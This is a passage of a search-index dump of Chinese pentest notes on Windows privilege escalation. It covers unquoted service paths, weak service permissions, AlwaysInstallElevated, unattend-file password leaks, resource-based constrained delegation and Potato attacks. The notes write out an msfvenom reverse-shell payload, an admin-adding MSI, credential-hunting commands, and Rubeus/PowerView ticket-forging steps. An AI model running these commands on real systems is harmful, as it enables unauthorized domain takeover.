/all.\u53d1\u73b0\u81ea\u5df1\u662fUsers\u7ec4\u7684\u3002 \u7136\u540e\u4f7f\u7528icacls\u547d\u4ee4\u67e5\u770b\u57282345Explorer\u76ee\u5f55\u7684\u6743\u9650\u5982\u4f55 users\u7ec4\u662f\u5b8c\u5168\u63a7\u5236\u6743\uff08F\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u76f4\u63a5\u7528msfvenom\u6784\u9020\u4e00\u4e2a\u53cd\u5f39shell\u7684exe\u3002\u547d\u540d\u4e3aProtect.exe\uff0c\u653e\u51652345Explorer\u76ee\u5f55\u3002\u6211\u8fd9\u91cc\u968f\u4fbf\u7f16\u7801\u4e86\u4e00\u4e0b msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai LHOST=192.168.111.129 LPORT=10068 -f exe -o Protect.exe \u7136\u540e\u6211\u4eec\u73b0\u5728\u662f\u6ca1\u6709\u80fd\u529b\u91cd\u542f\u670d\u52a1\u7684\u3002\u3002\u53ea\u80fd\u7b49\u7ba1\u7406\u5458\u91cd\u542f\u670d\u52a1\u6216\u8005\u673a\u5b50\u91cd\u542f\u3002\u7136\u540e\u5c31\u62ff\u5230SYSTEM\u6743\u9650\u4e86\u3002\u4f46\u662f\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5751\u70b9\uff0c\u8fd9\u4e2a\u5751\u70b9\u662f\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u542f\u52a8\u540e\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u672a\u4e0e Service Control Manager(SCM) \u901a\u8baf\uff0c\u5c31\u4f1a\u88ab\u505c\u6b62\u3002 \u6240\u4ee5\u6211\u4eec\u8981\u5728\u62ff\u5230shell\u540e\u53ca\u65f6\u7684\u8f6c\u79fb\u8fdb\u7a0b\u6216\u8005\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u3002 \u8f6c\u79fb\u8fdb\u7a0b\u5728msf\u4e2d\u5f88\u7b80\u5355\uff0cmeterpreter\u4e2d\u5148\u7528ps\u67e5\u770b\u8fdb\u7a0b\uff0c\u968f\u4fbf\u627e\u4e00\u4e2asystem\u6743\u9650\uff0c\u8bb0\u4f4f\u5176pid\uff0c\u7136\u540e migrate PID \u5373\u53ef\u5b8c\u6210\u8fdb\u7a0b\u8fc1\u79fb\u3002 \u4e0b\u9762\u6765\u8bf4\u8bf4\u9632\u6cbb\u65b9\u6cd5\u5427\u3002\u8fdb\u5165\u6ce8\u518c\u8868\u4fee\u6539\u7a97\u53e3\uff0c\u5728 HKEY_LOCAL_MACHINE >> SYSTEM >> CurrentControlSet >> Services \u8def\u5f84\u4e0b\u627e\u5230\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\uff0c\u4fee\u6539\u5176ImagePath\uff0c\u628a\u8def\u5f84\u524d\u540e\u52a0\u4e2a\u5f15\u53f7\u5c31\u53ef\u4e86\u3002","title":"\u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84 \uff08 Trusted Service Paths \uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#vulnerable-services","text":"\u540c\u6837\u770b\u8138\u4e14\u88ab\u52a8 \u8fd9\u4e2a\u653b\u51fb\u65b9\u6cd5\u5927\u81f4\u5206\u4e24\u7c7b 1.\u66ff\u6362\u670d\u52a1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u8fd9\u4e2a\u65b9\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u5982\u679c\u5bf9\u670d\u52a1\u4e8c\u8fdb\u5236\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u6709\u4fee\u6539\u6743\uff0c\u90a3\u4e48\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7a0b\u5e8f\u6765\u66ff\u6362\u539f\u6709\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u670d\u52a1\u3002\u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u800c\u4e14\u57fa\u672c\u4e0a\u653b\u51fb\u6d41\u7a0b\u548c Trusted Service Paths \u5982\u51fa\u4e00\u8f99\uff0c\u540c\u6837\u4e5f\u662f\u6bd4\u8f83\u88ab\u52a8\u5730\u7b49\u5f85\u91cd\u542f\u670d\u52a1\u624d\u80fd\u5f39shell\uff0c\u5c31\u4e0d\u518d\u6f14\u793a\u4e86\u3002 2.\u4fee\u6539\u670d\u52a1\u7684\u5c5e\u6027\u3002\u5982\u679c\u6211\u4eec\u80fd\u4fee\u6539\u670d\u52a1\u7684 BINARY_PATH_NAME \u5c5e\u6027\uff08\u8fd9\u4e2a\u5c5e\u6027\u7528\u4e8e\u6307\u5411\u670d\u52a1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e BINARY_PATH_NAME \u7684\u503c\u4e3a\u7cfb\u7edf\u547d\u4ee4\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\u65f6\u6211\u4eec\u7684\u7cfb\u7edf\u547d\u4ee4\u4f1a\u88ab\u6267\u884c\u3002 \u5bf9\u4e8e\u540e\u8005\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3e\u5de5\u5177\u6765\u5feb\u901f\u63ed\u793a\u51fa\u6211\u4eec\u80fd\u4fee\u6539\u54ea\u4e9b\u670d\u52a1\u7684\u5c5e\u6027\u3002 \u8fd9\u4e2a\u5de5\u5177\u6211\u4eec\u91c7\u7528accesschk.exe\uff0c\u5b83\u662f\u5fae\u8f6f\u4ea7\u51fa\u7684\uff0c\u57fa\u672c\u4e0d\u4f1a\u62a5\u6bd2\u3002 \u6211\u4eec\u901a\u8fc7\u8be5\u5de5\u5177\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula or accesschk.exe -uwcqv \"Users\" * /accepteula \u6765\u67e5\u770bUsers\u7ec4\uff08\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6765\u586b\u54ea\u4e2a\u7ec4\uff09\u5bf9\u54ea\u4e9b\u670d\u52a1\u6709\u54ea\u4e9b\u6743\u9650 \u5982\u679c\u5bf9\u67d0\u4e2a\u670d\u52a1\u6709service_all_access\u6216\u8005\u4ee5\u4e0b\u6743\u9650\uff0c\u5c31\u8bf4\u660e\u80fd\u5bf9\u5176\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\u3002 \u6bd4\u5982\u6211\u4eec\u5bf9Spooler\u670d\u52a1\u6709service_all_access\u6743\u9650\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fd9\u6837\u505a\u3002 \u901a\u8fc7\u4fee\u6539\u5176binPath\u4e3a\u6076\u610f\u6307\u4ee4\uff0c\u7136\u540e\u7b49\u5f85\u7ba1\u7406\u5458\u91cd\u542f\u670d\u52a1\uff0c\u6211\u4eec\u7684\u6076\u610f\u6307\u4ee4\u5c31\u4f1a\u88ab\u6267\u884c\u3002","title":"\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\uff08Vulnerable Services \uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#alwaysinstallelevated","text":"\u5982\u679cwindows\u542f\u7528\u4e86\u5982\u4e0b\u6ce8\u518c\u8868\u9879 [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] \u201cAlwaysInstallElevated\u201d=dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] \u201cAlwaysInstallElevated\u201d=dword:00000001 \u90a3\u4e48\u6240\u6709msi\uff08windows\u5e94\u7528\u5b89\u88c5\u7a0b\u5e8f\uff09\u90fd\u4f1a\u4ee5SYSTEM\u6743\u9650\u8fd0\u884c\u3002\u6b64\u65f6\u5982\u679c\u6211\u4eec\u6267\u884c\u4e00\u4e2a\u6076\u610fmsi\u7a0b\u5e8f\uff0c\u5373\u53ef\u8fbe\u5230\u63d0\u6743\u76ee\u7684 \u540c\u65f6\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u8fd9\u4e2a\u6ce8\u518c\u8868\u9879\u4e0d\u4e00\u5b9a\u603b\u662f\u5b58\u5728\u7684\u3002\uff08\u6bd4\u5982\u6211\u7684\u5b9e\u9a8c\u673a \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7reg query\u6765\u9a8c\u8bc1\u8fd9\u4e24\u6761\u6ce8\u518c\u8868\u9879\u7684\u60c5\u51b5 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated \u82e5\u5747\u4e3a1\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7msfvenom\u751f\u6210\u6076\u610fmsi\u6765\u63d0\u6743 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi \u7136\u540e\u6267\u884c\uff0c\u83b7\u5f97\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u3002","title":"AlwaysInstallElevated"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_2","text":"Unattend.xml sysprep.xml\u548csysprep.inf\u6587\u4ef6 GPP.xml \u5b58\u5728\u7740\u4e00\u5b9a\u4fe1\u606f\u6cc4\u9732\uff0c\u4ed6\u4eec\u901a\u5e38\u5b58\u5728\u4e8e\u4ee5\u4e0b\u8def\u5f84 C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ \u627e\u5230\u540e\uff0c\u627e\u5230 Unattend.xml \u6587\u4ef6\u4e2d\u7684 \u6807\u7b7e\u3002\u5c31\u6709\u53ef\u80fd\u627e\u5230\u7528\u6237\u7684\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u3002\u3002 <UserAccounts> <LocalAccounts> <LocalAccount> <Password> <Value>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=</Value> //PASSWORD <PlainText>false</PlainText> </Password> <Description>Local Administrator</Description> <DisplayName>Administrator</DisplayName> <Group>Administrators</Group> <Name>Administrator</Name> </LocalAccount> </LocalAccounts> </UserAccounts> \u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u67e5\u8be2\u6307\u4ee4 C:\\Users\\user\\Desktop> dir C:\\ /s /b /c | findstr /sr \\*password\\* reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_3","text":"refer: https://xz.aliyun.com/t/7454","title":"\u57fa\u4e8e\u8d44\u6e90\u7684\u57df\u59d4\u6d3e\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_4","text":"1.S4U2SELF \u534f\u8bae\u53ef\u4ee5\u5728\u7528\u6237\u6ca1\u6709\u914d\u7f6e TrustedToAuthenticationForDelegation \u5c5e\u6027\uff08\u5373\u5f00\u542f\u4f7f\u7528\u4efb\u4f55\u534f\u8bae\u8ba4\u8bc1\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff09\u65f6\u88ab\u8c03\u7528\uff0c\u4f46\u662f\u8fd4\u56de\u7684ST\u662f\u4e0d\u53ef\u88ab\u8f6c\u53d1\u7684\u3002 2.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e3b\u673a \u5728\u88ab\u53e6\u4e00\u53f0\u4e3b\u673a\u59d4\u6d3e\u8bbf\u95ee\u65f6\uff0c\u5728S4U2PROXY\u8fc7\u7a0b\u4e2d\u63d0\u4ea4\u8fc7\u6765\u7684ST\u5982\u679c\u5373\u4f7f\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\u3002KDC\u4f9d\u65e7\u4f1a\u8fd4\u56de\u6709\u6548\u7684ST2\u3002 3.\u6bcf\u4e2a\u666e\u901a\u57df\u7528\u6237\u9ed8\u8ba4\u53ef\u4ee5\u521b\u5efa\u81f3\u591a\u5341\u4e2a\u673a\u5668\u8d26\u6237\uff08 \u7531MachineAccountQuota\u5c5e\u6027\u51b3\u5b9a \uff09\uff0c\u6bcf\u4e2a\u673a\u5668\u8d26\u6237\u88ab\u521b\u5efa\u65f6\u90fd\u4f1a\u81ea\u52a8\u6ce8\u518cSPN: RestrictedKrbHost/domain \u548c HOST/domain \u8fd9\u4e24\u4e2aSPN","title":"\u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_5","text":"\u5047\u8bbe\u5f00\u542f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e3aA 1.\u9996\u5148\u8981\u6709\u4e00\u4e2a\u5bf9\u5f53\u524d\u8ba1\u7b97\u673a\u6709\u5199\u6743\u9650\u7684\u8d26\u6237\uff0c\u624d\u80fd\u5bf9A\u8bbe\u7f6e\u53ef\u4ee5 \u88ab \u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1\u8d26\u6237\u3002 2.\u5229\u7528\u5f53\u524d\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u914d\u7f6e\u597d\u673a\u5668\u8d26\u6237\u5230A\u7684 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e 3.\u56e0\u4e3a\u673a\u5668\u8d26\u6237\u662f\u6211\u4eec\u521b\u5efa\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4ed6\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u53ef\u4ee5\u8ba9\u5b83\u5229\u7528S4U2SELF\u534f\u8bae\u83b7\u5f97\u4e00\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u901a\u8fc7S4U2PROXY\uff0c\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u57fa\u7840\u4e0a\u83b7\u5f97\u6709\u6548\u7684\u8bbf\u95eeA cifs\u670d\u52a1\u7684ST2\u3002 4.\u7528ST2\u8bbf\u95eeA\u7684CIFS\u670d\u52a1\uff0c\u6743\u9650\u83b7\u5f97\u3002","title":"\u653b\u51fb\u6d41\u7a0b:"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_6","text":"\u8fd9\u4e2a\u653b\u51fb\u8bf4\u767d\u4e86\u5c31\u662f\u4e2a\u63d0\u6743... \u9996\u5148\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u57df\u63a7\u662f\u5426\u662fwin2012\u4ee5\u4e0a\u7684\u4e3b\u673a\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\u624d\u80fd\u5f00\u542f \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u6211\u4eec\u4f7f\u7528powersploit\u4e0b\u7684powerview\u811a\u672c\u3002\u6267\u884c\u547d\u4ee4 get-netdomaincontroller \u53ef\u4ee5\u83b7\u5f97\u57df\u63a7WIN\u7248\u672c \u7136\u540e\u6211\u4eec\u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u54ea\u53f0\u4e3b\u673a\u6709\u5199\u6743\u9650\u3002\u56e0\u4e3a\u662f\u5b9e\u9a8c\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6765\u770b\u770b\u600e\u4e48\u914d\u7f6e\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u7684\u6743\u9650\u3002 \u76f4\u63a5\u5728\u57df\u63a7\u4e0a\u627e\u5230\u67d0\u4e3b\u673a\uff0c\u7136\u540e\u8fdb\u5165\u5728\u5c5e\u6027\u91cc\u8fdb\u5165\u5b89\u5168\u9009\u9879\u5361\uff0c\u6dfb\u52a0\u67d0\u7528\u6237\uff0c\u7136\u540e\u7ed9\u8fd9\u4e2a\u7528\u6237\u5206\u914d\u6743\u9650\u5373\u53ef\u3002 \u6211\u4eec\u4f9d\u65e7\u4f7f\u7528powerview\u3002\u5148\u8c03\u7528 Get-DomainUser -Identity username -Properties objectsid \u6765\u83b7\u53d6\u5f53\u524d\u7528\u6237SID \u7136\u540e Get-DomainObjectAcl -Identity \u4e3b\u673a\u540d | ?{$_.SecurityIdentifier -match \"\u521a\u521a\u5f97\u5230\u7684SID\"} \u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u53f0\u4e3b\u673a\u662f\u5426\u6709\u5199\u6743\u9650\u3002 \u5982\u679c\u6709 GenericAll\uff08\u5b8c\u5168\u63a7\u5236\u6743\uff09\uff0cGenericWrite\u3001WriteProperty\u3001WriteDacl \u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8be5\u7528\u6237\u80fd\u4fee\u6539\u8ba1\u7b97\u673a\u7684\u8d26\u6237\u5c5e\u6027\u3002 \u5982\u56fe\u770b\u5230\u6211\u4eec\u5bf9WIN7\u8fdb\u884c\u64cd\u4f5c \u597d\u7684\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u8981\u521b\u7acb\u4e00\u4e2a\u673a\u5668\u7528\u6237\u4e86\u3002\u6839\u636e\u7f51\u4e0a\u641c\u7d22\u7ed3\u679c\uff0c\u4f7f\u7528powermad\u8fd9\u4e2aps\u811a\u672c\u53ef\u4ee5\u5f88\u5feb\u6377\u7684\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\u3002 https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force) \u597d\u7684\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5bc6\u7801hack\uff0c\u540d\u4e3ahacksystem\u7684\u673a\u5668\u8d26\u6237\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u914d\u7f6ehacksystem\u5230WIN7\u7684\u59d4\u6d3e\u4e86\u3002\u6211\u4eec\u9700\u8981\u505a\u7684\uff0c\u662f\u4fee\u6539WIN7\u7684 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u7684\u503c \uff0c\u8fd9\u4e2a\u64cd\u4f5c\u6211\u4eec\u7528powerview\u5b9e\u73b0\u3002 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" #\u8fd9\u513f\u7684sid\u662f\u6211\u4eec\u521b\u5efa\u7684#\u673a\u5668\u7528\u6237#evilsystem\u7684sid $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose \u81f3\u4e8e\u673a\u5668\u8d26\u6237SID\u600e\u4e48\u83b7\u5f97\uff0cpowerview\u4e0b\u7684 get-domiancomputer hacksystem \u7136\u540e\u4f7f\u7528 Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity \u67e5\u770b\u59d4\u6d3e\u662f\u5426\u8bbe\u7f6e\u6210\u529f Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose \u6b64\u547d\u4ee4\u53ef\u4ee5\u6e05\u9664 msds-allowedtoactonbehalfofotheridentity\u5c5e\u6027\u7684\u503c \u73b0\u5728\u90fd\u7edf\u7edf\u8bbe\u7f6e\u597d\u4e86\uff0c\u5f00\u59cb\u4e0b\u4e00\u6b65\u5427\u3002 \u7f51\u4e0a\u4e00\u822c\u7528\u7684rubeus\uff0c\u8fd9\u91cc\u6211\u7528kekeo\u5427 Rubeus.exe hash /user:xxx /password:xxx /domain:xxx \u672c\u5730\u8fd0\u7b97\u51fa\u673a\u5668\u7528\u6237ntlm hash \u8fd9\u91cc\u501f\u7528\u4e00\u4e0b\u522b\u4eba\u7684\u56fe Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u5199\u5165\u7968\u636e \u7136\u540e\u6211\u5728\u672c\u673a\u4f7f\u7528\u4ee5\u4e0a\u65b9\u6cd5\u540eklist\u4e00\u4e0b\uff0c\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u7968\u636e \u4f46\u662fdir \\test1\\c\\$\u65f6\u672c\u673a\u83ab\u540d\u5176\u5999\u4e0d\u80fd\u8fdb\u884ckerberos\u9a8c\u8bc1\uff0c\u6211\u670d\u4e86\u300b\u3002\u3002\u4f46\u4e0d\u7ba1\u600e\u6837\uff0c\u6211\u4eec\u62ff\u5230\u94f6\u7968\u4e86","title":"\u5b9e\u64cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_7","text":"\u82e5\u6211\u4eec\u7684administrator\u7528\u6237\u88ab\u8bbe\u7f6e\u4e3a\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u6216\u8005\u88ab\u52a0\u5165\u4fdd\u62a4\u7ec4\uff0c\u6309\u7406\u8bf4\u4ed6\u7684\u8bbf\u95ee\u5c31\u4e0d\u80fd\u8fdb\u884c\u59d4\u6d3e\u3002 \u6211\u4eec\u5728\u4ee5administrator\u8d26\u6237\u8eab\u4efd\u8fdb\u884cS4U\u65f6\uff0c\u53ea\u80fd\u8fdb\u884cS4U2SELF\uff0c\u4e0d\u80fd\u8fdb\u884cS4U2PROXY\u3002\u6211\u4eec\u7528 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u7ee7\u7eed\u5b9e\u9a8cadministrator\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u6b64\u65f6\u6211\u4eec\u7528 rubeus.exe describe /ticker:S4Ubase64\u52a0\u5bc6\u7684\u7968\u636e \u53ef\u4ee5\u53d1\u73b0servicename\u5e76\u6ca1\u6709\u6307\u5b9a\u67d0\u4e2a\u670d\u52a1\uff0c\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u8d26\u6237.\u5373\u53d1\u751f\u4e86\u670d\u52a1\u540d\u79f0\u7f3a\u5931\u7684\u95ee\u9898\u3002\u5f88\u7b80\u5355\uff0c\u628a\u7968\u636e\u4fee\u6539\u4e00\u4e0b\u5c31\u884c\u4e86.\u7f51\u4e0a\u5f88\u591a\u8bf4\u7528\u8fd9\u4e2a\u5de5\u5177 https://www.pkisolutions.com/tools/asn1editor/ \u4f46\u5b9e\u9645\u4e0arubeus\u4e5f\u80fd\u5b8c\u6210\u7968\u636e\u4fee\u6539 rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt \u5b8c\u4e8b","title":"\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#potato","text":"","title":"POTATO \u5bb6\u65cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#hot-potato","text":"\u70ed\u571f\u8c46\u63d0\u6743\u3002\u5f88\u65e9\u524d\u5c31\u542c\u8bf4\u8fc7\u4e86\uff0c\u4f46\u4e00\u76f4\u6ca1\u53bb\u4e86\u89e3\u8fc7\u3002\u524d\u7f6e\u77e5\u8bc6\u662fntlm relay,\u53ef\u4ee5\u53bb\u4e86\u89e3\u4e86\u89e3\u3002 potato\u5bb6\u65cf\u6709\u5f88\u591a\uff0chot potato\u53ea\u662f\u5176\u4e2d\u4e00\u79cd\u63d0\u6743\u65b9\u5f0f\u3002 \u6211\u73af\u5883\u6709\u95ee\u9898\uff0c\u4e0d\u80fd\u5f88\u597d\u7684\u590d\u73b0\ud83d\ude43\uff0c\u6293\u5305\u5206\u6790\u5565\u7684\u5148\u5495\u5495\u5427\u3002 https://github.com/foxglovesec/Potato\ud83d\udc48\u5de5\u5177 https://foxglovesecurity.com/2016/01/16/hot-potato/ \ud83d\udc48HOT POTATO\u6280\u672f\u6587\u6863\uff0c\u56fd\u5185\u57fa\u672c\u4e0a\u7ffb\u8bd1\u8fd9\u4e2a\u6765\u7684\u3002 \u63d0\u6743\u6b65\u9aa4\u5927\u6982\u662f\u8fd9\u4e2a\u6d41\u7a0b 1.\u672c\u5730nbns\u670d\u52a1\u6b3a\u9a97 2.wpad\u52ab\u6301 3.HTTP->SMB \u7684 ntlm relay 1.\u672c\u5730nbns\u670d\u52a1\u6b3a\u9a97 Windows\u57df\u540d\u89e3\u6790\u89c4\u5219\u662f \u672c\u5730HOST\u6587\u4ef6-\u300bdns\u67e5\u8be2-\u300bNBNS\u6216\u8005LLMNR\u67e5\u8be2 \u4e00\u65e6\u672c\u5730\u53d1\u51faNBNS\u67e5\u8be2\uff0c\u6211\u4eec\u672c\u5730\u5c31\u53ef\u4ee5\u8fc5\u901f\u54cd\u5e94\uff0c\u556a\u7684\u4e00\u4e0b\u5c31\u54cd\u5e94\u4e86\uff0c\u5f88\u5feb\u554a\uff0c\u672c\u5730\u53d1\u5305\u5f88\u5feb\uff0c\u53ea\u8981\u53d1\u51faNBNS\u5305\u57fa\u672c\u4e0a\u90fd\u80fd\u88ab\u6211\u4eec\u672c\u5730\u53d1\u5305\u54cd\u5e94\u3002 \u4f46\u662f\u4ee5\u4e0a\u6b65\u9aa4\u8fd8\u662f\u6709\u4e00\u4e9b\u7ec6\u8282\u7684\uff1a\u6211\u4eec\u5f53\u524d\u5e76\u975e\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5927\u51e0\u7387\u662f\u65e0\u6cd5\u55c5\u63a2\u672c\u5730\u6d41\u91cf\u7684,\u5982\u679c\u6211\u4eec\u80fd\u591f\u4e8b\u5148\u77e5\u9053\u76ee\u6807\u4e3b\u673a\u671f\u671bNBNS\u67e5\u8be2\u83b7\u5f97\u7684\u4e3b\u673a\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u54cd\u5e94\uff0c\u5bf9\u53d1\u9001NBNS\u67e5\u8be2\u7684\u90a3\u4e2a\u4e3b\u673a\u5feb\u901f\u7684\u5927\u91cf\u53d1\u9001NBNS\u54cd\u5e94 